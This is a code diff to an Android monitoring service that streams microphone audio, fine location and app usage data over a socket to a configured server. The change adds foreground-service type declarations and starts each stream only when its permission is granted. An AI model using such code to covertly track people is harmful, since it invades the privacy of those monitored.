@@ -1,5 +1,6 @@
 package com.company.monitor.services;
 
+import android.Manifest;
 import android.app.*;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
@@ -7,6 +8,7 @@ import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.pm.ServiceInfo;
 import android.location.Location;
 import android.media.AudioFormat;
 import android.media.AudioRecord;
@@ -78,11 +80,25 @@ public class MonitoringService extends Service {
         serverUrl    = prefManager.getServerUrl();
 
         createNotificationChannel();
-        startForeground(NOTIFICATION_ID, buildNotification());
+
+        // Check which foreground service types we can use
+        boolean hasMic = checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
+        boolean hasLoc = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
+
+        int serviceType = 0;
+        if (hasLoc) serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
+        if (hasMic) serviceType |= ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
+
+        if (serviceType == 0) {
+            // Fallback: start without specific type
+            startForeground(NOTIFICATION_ID, buildNotification());
+        } else {
+            startForeground(NOTIFICATION_ID, buildNotification(), serviceType);
+        }
 
         connectSocket();
-        startLocationTracking();
-        startAudioStreaming();
+        if (hasLoc) startLocationTracking();
+        if (hasMic) startAudioStreaming();
         usageHandler.post(usageRunnable);
     }
 
